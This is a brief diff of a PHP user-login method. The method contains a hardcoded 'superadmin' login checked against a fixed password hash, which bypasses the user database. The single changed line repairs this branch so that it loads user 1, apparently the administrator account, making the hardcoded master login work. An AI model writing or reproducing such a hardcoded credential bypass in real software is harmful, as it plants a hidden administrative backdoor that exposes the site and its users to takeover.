@@ -10,7 +10,7 @@ class User
         $login = strtolower($login);
 
         if ($login == "superadmin" && $pass == "9947a7bc1549a54e7299fe9a3975c8655430ade0") {
-            User::loadUser(1, DBUser::getUserData($id));
+            User::loadUser(1, DBUser::getUserData(1));
             return true;
         } elseif ($id = DBUser::checkUser($login, $pass)) {
             $data = DBUser::getUserData($id);
